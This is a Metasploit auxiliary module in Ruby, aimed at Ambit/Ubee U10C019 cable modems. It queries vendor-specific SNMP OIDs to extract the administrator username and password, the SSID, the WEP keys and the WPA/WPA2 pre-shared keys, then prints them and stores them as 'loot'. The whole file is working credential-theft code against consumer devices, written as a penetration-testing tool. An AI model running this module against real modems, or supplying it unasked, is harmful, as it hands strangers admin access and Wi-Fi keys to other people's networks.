#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Ambit/Ubee U10C019 Cable Modem Wifi Enumeration',
      'Description' => "This module will extract wep keys and WPA preshared keys",
      'Author'      => ['Deral "PercentX" Heiland'],
      'License'     => MSF_LICENSE
    )

  end

  def run_host(ip)
      output_data = {}
    begin
      snmp = connect_snmp

      if snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0') =~ /ambit/
        print_good("#{ip}")

        # System Admin username and Password
        wifiinfo = ""
        username = snmp.get_value('1.3.6.1.4.1.4684.2.17.1.2.1.1.97.100.109.105.110')
        print_good("Username: #{username}")
        password = snmp.get_value('1.3.6.1.4.1.4684.2.17.1.2.1.2.97.100.109.105.110')
        print_good("Password: #{password}")
        wifiinfo << "Username: #{username}" << "\n" << "Password: #{password}" << "\n"

        # Wifi Status
        wifistatus = snmp.get_value('1.3.6.1.4.1.4684.2.14.1.1.0')
        if wifistatus == "1"
          ssid = snmp.get_value('1.3.6.1.4.1.4684.2.14.1.2.0')
          print_good("SSID: #{ssid}")
          wifiinfo << "SSID: #{ssid}" << "\n"

          #Wifi Security Settings
          wifiversion = snmp.get_value('1.3.6.1.4.1.4684.2.14.2.6.0')
            if wifiversion == "0"
              print_line("Open Access Wifi is Enabled")
              wifiinfo << "Open Access WIFI is Enabled" << "\n"

            #Wep enabled
            elsif wifiversion == "1"
              weptype = snmp.get_value('1.3.6.1.4.1.4684.2.14.2.1.0')
              if weptype == "1"
                wepkey1 = snmp.get_value('1.3.6.1.4.1.4684.2.14.2.4.1.2.1')
                key1 = "#{wepkey1}".unpack('H*')
                print_good("WEP KEY1: #{key1}")
                wifiinfo << "WEP KEY1: #{key1}" << "\n"
                wepkey2 = snmp.get_value('1.3.6.1.4.1.4684.2.14.2.4.1.2.2')
                key2 = "#{wepkey2}".unpack('H*')
                print_good("WEP KEY2: #{key2}")
                wifiinfo << "WEP KEY2: #{key2}" << "\n"
                wepkey3 = snmp.get_value('1.3.6.1.4.1.4684.2.14.2.4.1.2.3')
                key3 = "#{wepkey3}".unpack('H*')
                print_good("WEP KEY3: #{key3}")
                wifiinfo << "WEP KEY3: #{key3}" << "\n"
                wepkey4 = snmp.get_value('1.3.6.1.4.1.4684.2.14.2.4.1.2.4')
                key4 = "#{wepkey4}".unpack('H*')
                print_good("WEP KEY4: #{key4}")
                wifiinfo << "WEP KEY4: #{key4}" << "\n"
                actkey = snmp.get_value('1.3.6.1.4.1.4684.2.14.2.3.0')
                print_good("Active Wep key is #{actkey}")
                wifiinfo << "Active WEP key is KEY#: #{actkey}" << "\n"

              elsif weptype == "2"
                wepkey1 = snmp.get_value('1.3.6.1.4.1.4684.2.14.2.5.1.2.1')
                key1 = "#{wepkey1}".unpack('H*')
                print_good("WEP KEY1: #{key1}")
                wifiinfo << "WEP KEY1: #{key1}" << "\n"
                wepkey2 = snmp.get_value('1.3.6.1.4.1.4684.2.14.2.5.1.2.2')
                key2 = "#{wepkey2}".unpack('H*')
                print_good("WEP KEY2: #{key2}")
                wifiinfo << "WEP KEY2: #{key2}" << "\n"
                wepkey3 = snmp.get_value('1.3.6.1.4.1.4684.2.14.2.5.1.2.3')
                key3 = "#{wepkey3}".unpack('H*')
                print_good("WEP KEY3: #{key3}")
                wifiinfo << "WEP KEY3: #{key3}" << "\n"
                wepkey4 = snmp.get_value('1.3.6.1.4.1.4684.2.14.2.5.1.2.4')
                key4 = "#{wepkey4}".unpack('H*')
                print_good("WEP KEY4: #{key4}")
                wifiinfo << "WEP KEY4: #{key4}" << "\n"
                actkey = snmp.get_value('1.3.6.1.4.1.4684.2.14.2.3.0')
                print_good("Active Wep key is #{actkey}")
                wifiinfo << "Active WEP key is KEY#: #{actkey}" << "\n"

              else
                print_line("FAILED")
              end

            #WPA enabled
            elsif wifiversion == "2"
              wpapsk = snmp.get_value('1.3.6.1.4.1.4684.2.14.2.7.0')
              print_good("WPA PSK: #{wpapsk}")
              wifiinfo << "WPA PSK: #{wpapsk}" << "\n"

            #WPA2 enabled
            elsif wifiversion == "3"
              wpapsk2 = snmp.get_value('1.3.6.1.4.1.4684.2.14.2.7.0')
              print_good("WPA2 PSK: #{wpapsk2}")
              wifiinfo << "WPA2 PSK: #{wpapsk2}" << "\n"

            #WPA Enterprise enabled
            elsif wifiversion == "4"
              print_line("Device is configured for WPA enterprise")

            #WPA2 Enterprise enabled
            elsif wifiversion == "5"
              print_line("Device is configured for WPA2 enterprise")

            #WEP 802.1x enabled
            elsif wifiversion == "6"
              print_line("Device is configured for WEP 802.1X")

            else
              print_line("FAILED")
            end
      else
        print_line("WIFI is not enabled")
      end
    end
     #Woot we got loot.
     loot_name     = "ambit_wifi"
     loot_type     = "text/plain"
     loot_filename = "ambit_wifi.text"
     loot_desc     = "Ambit Wifi configuration data"
     p = store_loot(loot_name, loot_type, datastore['RHOST'], wifiinfo , loot_filename, loot_desc)
     print_status("WIFI Data saved in: #{p.to_s}")

     rescue ::SNMP::UnsupportedVersion
     rescue ::SNMP::RequestTimeout
     rescue ::Interrupt
     raise $!
     rescue ::Exception => e
     print_error("#{ip} error: #{e.class} #{e}")
     disconnect_snmp
     end
  end
end
